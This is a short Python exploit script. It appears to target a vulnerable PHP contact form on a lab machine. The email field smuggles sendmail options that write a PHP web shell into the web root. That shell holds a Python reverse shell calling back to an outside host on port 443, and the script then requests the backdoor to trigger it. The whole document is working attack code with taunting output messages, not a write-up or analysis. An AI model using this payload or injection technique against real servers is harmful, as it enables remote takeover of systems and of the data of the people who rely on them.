
from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh


target = 'http://192.168.233.166/contact.php'
backdoor = '/vic3.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.233.128\\\',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/vic3.php server\" @protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields, boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

proxy = {
    'http': 'http://127.0.0.1:8080',  # Puerto donde escucha Burp Suite
    'https': 'http://127.0.0.1:8080'
}

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers, proxies=proxy)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
g = requests.get(f"http://192.168.233.166{backdoor}", headers=headers)
